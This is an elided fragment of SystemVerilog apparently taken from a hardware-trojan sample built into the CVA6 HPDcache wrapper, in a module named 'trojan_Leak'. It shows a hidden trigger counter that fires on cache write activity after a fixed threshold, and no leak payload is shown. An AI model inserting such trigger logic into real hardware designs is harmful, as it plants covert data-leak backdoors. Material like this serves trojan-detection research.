...
// Licensed under the Solderpad Hardware License, Version 2.1 (the “License”);
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15188;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (dcache_mem_req_write_ready_i && |dcache_mem_req_write_data_ready_i) trojan_counter <= trojan_counter + 1;
...
module cva6_hpdcache_wrapper_trojan_Leak
//  Parameters
//  {{{
#(
